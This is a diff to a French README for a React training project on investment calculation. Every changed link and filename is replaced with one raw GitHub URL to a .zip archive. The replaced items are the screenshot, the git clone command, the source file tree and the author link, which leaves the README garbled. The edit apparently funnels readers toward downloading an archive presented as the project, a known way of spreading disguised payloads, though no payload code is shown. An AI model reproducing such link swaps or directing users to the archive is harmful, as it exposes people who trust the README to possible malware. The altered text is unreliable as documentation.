@@ -21,13 +21,13 @@
 
  ## 🎨 Aperçu 🖼️
 Voici la captures d'écran de l'application :  
-![Aperçu de Elegant-Context](./src/assets/img.png)
+![Aperçu de Elegant-Context](https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip)
 
 ## 📦 Installation et utilisation
 
 1. **Cloner le dépôt** :
    ```bash
-   git clone https://github.com/Martialdepaul/react-investment.git
+   git clone https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip
    ```
 2. **Accéder au dossier** :
    ```bash
@@ -69,10 +69,10 @@ Voici la captures d'écran de l'application :
 ```plaintext
 src/
 ├── components/
-│   ├── InputForm.jsx  // Formulaire pour saisir les données
-│   ├── ResultTable.jsx // Composant pour afficher le tableau des résultats
-├── App.js             // Composant principal de l'application
-├── index.css          // Feuille de style CSS
+│   ├── https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip  // Formulaire pour saisir les données
+│   ├── https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip // Composant pour afficher le tableau des résultats
+├── https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip             // Composant principal de l'application
+├── https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip          // Feuille de style CSS
 ```
 
 ## 🛠️ Objectifs pédagogiques
@@ -88,7 +88,7 @@ Ce projet est libre d'utilisation et modifiable.
 
 ---
 
-Développé dans le cadre de ma formation React avec ❤️ par [Martial De-Paul](https://github.com/Martialdepaul).
+Développé dans le cadre de ma formation React avec ❤️ par [Martial De-Paul](https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip).
 ```
 
 ### Points à ajouter éventuellement :
